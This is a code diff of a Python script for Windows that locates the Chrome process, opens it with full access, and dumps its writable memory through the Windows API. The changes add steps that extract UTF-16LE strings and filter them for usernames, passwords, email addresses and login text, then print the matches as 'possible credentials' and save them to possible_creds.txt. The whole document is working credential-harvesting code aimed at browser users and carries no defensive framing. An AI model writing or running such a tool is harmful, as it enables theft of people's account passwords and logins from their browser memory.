@@ -1,104 +1,109 @@
 import ctypes
 import psutil
 import re
+import os
+from ctypes import wintypes
+import time
 
 # Constants
-PROCESS_QUERY_INFORMATION = 0x0400
-PROCESS_VM_READ = 0x0010
+PROCESS_ALL_ACCESS = 0x1F0FFF
+CHROME_EXE = "chrome.exe"
+
+# Windows API setup
+kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+
+OpenProcess = kernel32.OpenProcess
+ReadProcessMemory = kernel32.ReadProcessMemory
+VirtualQueryEx = kernel32.VirtualQueryEx
+CloseHandle = kernel32.CloseHandle
+
 MEM_COMMIT = 0x1000
 PAGE_READWRITE = 0x04
 
-# Memory info structure for VirtualQueryEx
 class MEMORY_BASIC_INFORMATION(ctypes.Structure):
-    _fields_ = [("BaseAddress", ctypes.c_void_p),
-                ("AllocationBase", ctypes.c_void_p),
-                ("AllocationProtect", ctypes.c_ulong),
-                ("RegionSize", ctypes.c_size_t),
-                ("State", ctypes.c_ulong),
-                ("Protect", ctypes.c_ulong),
-                ("Type", ctypes.c_ulong)]
+    _fields_ = [
+        ('BaseAddress',       ctypes.c_void_p),
+        ('AllocationBase',    ctypes.c_void_p),
+        ('AllocationProtect', wintypes.DWORD),
+        ('RegionSize',        ctypes.c_size_t),
+        ('State',             wintypes.DWORD),
+        ('Protect',           wintypes.DWORD),
+        ('Type',              wintypes.DWORD),
+    ]
 
-# Get PID of chrome.exe
 def get_chrome_pid():
-    for proc in psutil.process_iter(['name']):
-        try:
-            if 'chrome.exe' in proc.info['name'].lower():
-                return proc.pid
-        except (psutil.NoSuchProcess, psutil.AccessDenied):
-            continue
+    for proc in psutil.process_iter(['pid', 'name']):
+        if proc.info['name'] == CHROME_EXE:
+            return proc.info['pid']
     return None
 
-# Open Chrome process
-def open_process(pid):
-    return ctypes.windll.kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
+def dump_memory(pid):
+    process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+    if not process_handle:
+        raise Exception("Could not open process. Try running as Administrator.")
 
-# Enumerate readable memory regions
-def enum_memory_regions(process_handle):
     address = 0
-    mem_info = MEMORY_BASIC_INFORMATION()
-    while ctypes.windll.kernel32.VirtualQueryEx(
-        process_handle,
-        ctypes.c_void_p(address),
-        ctypes.byref(mem_info),
-        ctypes.sizeof(mem_info)
-    ):
-        if mem_info.State == MEM_COMMIT and mem_info.Protect & PAGE_READWRITE:
-            yield (mem_info.BaseAddress, mem_info.RegionSize)
-        address += mem_info.RegionSize
+    memory_dump = b""
 
-# Read memory block
-def read_memory(process_handle, base_address, size):
-    buffer = ctypes.create_string_buffer(size)
-    bytes_read = ctypes.c_size_t(0)
-    if ctypes.windll.kernel32.ReadProcessMemory(
-        process_handle,
-        ctypes.c_void_p(base_address),
-        buffer,
-        size,
-        ctypes.byref(bytes_read)
-    ):
-        return buffer.raw[:bytes_read.value]
-    return None
+    mbi = MEMORY_BASIC_INFORMATION()
+    mbi_size = ctypes.sizeof(mbi)
 
-# Extract UTF-16LE strings with 2+ characters
-def find_utf16le_strings(data, min_len=2):
-    # UTF-16LE pattern: printable ASCII chars with nulls, at least 2 characters
-    pattern = re.compile(b'(?:[\x20-\x7E]\x00){' + str(min_len).encode() + b',}')
-    found = []
-    for match in pattern.finditer(data):
-        try:
-            s = match.group().decode('utf-16le')
-            found.append(s)
-        except UnicodeDecodeError:
-            continue
-    return found
+    while VirtualQueryEx(process_handle, ctypes.c_void_p(address), ctypes.byref(mbi), mbi_size):
+        if mbi.State == MEM_COMMIT and mbi.Protect == PAGE_READWRITE:
+            buffer = ctypes.create_string_buffer(mbi.RegionSize)
+            bytesRead = ctypes.c_size_t(0)
+
+            if ReadProcessMemory(process_handle, ctypes.c_void_p(address), buffer, mbi.RegionSize, ctypes.byref(bytesRead)):
+                memory_dump += buffer.raw[:bytesRead.value]
+
+        address += mbi.RegionSize
+
+    CloseHandle(process_handle)
+    return memory_dump
+
+def extract_utf16le_strings(data, min_length=6):
+    pattern = re.compile((b'(?:[\x20-\x7E]\x00){%d,}' % min_length))
+    return [match.decode('utf-16le') for match in pattern.findall(data)]
+
+def save_to_file(strings, filename):
+    with open(filename, 'w', encoding='utf-8') as f:
+        for s in strings:
+            f.write(s + '\n')
+
+def filter_creds(strings):
+    possible_creds = []
+    for s in strings:
+        if any(x in s.lower() for x in ['username', 'password', '@', '.com', 'login']) and len(s) > 6:
+            possible_creds.append(s)
+    return possible_creds
 
 def main():
     pid = get_chrome_pid()
     if not pid:
-        print("Chrome process not found.")
+        print("[!] Chrome is not running.")
         return
 
     print(f"[+] Found Chrome PID: {pid}")
-    process_handle = open_process(pid)
-    if not process_handle:
-        print("[-] Failed to open Chrome process. Run as admin?")
-        return
+    print("[*] Taking memory dump...")
+    dump = dump_memory(pid)
+    print(f"[+] Memory dump completed. Size: {len(dump)} bytes")
 
-    print("[*] Scanning memory...")
-    seen = set()
-    for base_addr, region_size in enum_memory_regions(process_handle):
-        data = read_memory(process_handle, base_addr, region_size)
-        if data:
-            strings = find_utf16le_strings(data)
-            for s in strings:
-                # Avoid duplicates
-                if s not in seen:
-                    seen.add(s)
-                    print(s)
+    print("[*] Extracting UTF-16LE strings...")
+    strings = extract_utf16le_strings(dump)
+    print(f"[+] Found {len(strings)} strings.")
 
-    ctypes.windll.kernel32.CloseHandle(process_handle)
-    print("[+] Done.")
+    print("[*] Filtering possible credentials...")
+    creds = filter_creds(strings)
+
+    if creds:
+        print("[+] Possible credentials found:\n")
+        for c in creds:
+            print(f"    {c}")
+    else:
+        print("[-] No credential-like strings found.")
+
+    save_to_file(creds, "possible_creds.txt")
+    print("[*] Saved to possible_creds.txt")
 
 if __name__ == "__main__":
     main()
